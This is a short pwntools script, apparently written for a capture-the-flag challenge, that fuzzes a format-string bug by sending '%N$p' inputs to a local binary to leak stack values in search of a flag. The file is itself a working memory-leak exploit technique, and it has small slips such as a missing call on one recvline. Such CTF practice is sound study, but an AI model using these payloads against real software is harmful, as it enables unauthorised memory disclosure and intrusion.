from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./chall', checksec=False)

# Let's fuzz 100 values
for i in range(30):
    try:
        # Create process (level used to reduce noise)
        p = process(level='error')
        #p = remote('challenges.ctf.compfest.id', 20007)
        p.sendlineafter(b'): ', '2')
        # When we see the user prompt '>', format the counter
        # e.g. %2$s will attempt to print second pointer as string
        p.sendlineafter(b'ya:\n', '%{}$p'.format(i).encode())
        # Receive the response
#        p.recvline()
        result = str(p.recvline()) + str(p.recvline)
        # Check for flag
        # if("flag" in str(result).lower()):
#        try:
#           result = bytes.fromhex(str(result.decode()).split(': ')[1].replace('\n', ''))
#        except:
#           pass
        print(str(i) + ': ' + str(result))
        # Exit the process
        p.close()
    except EOFError:
        pass
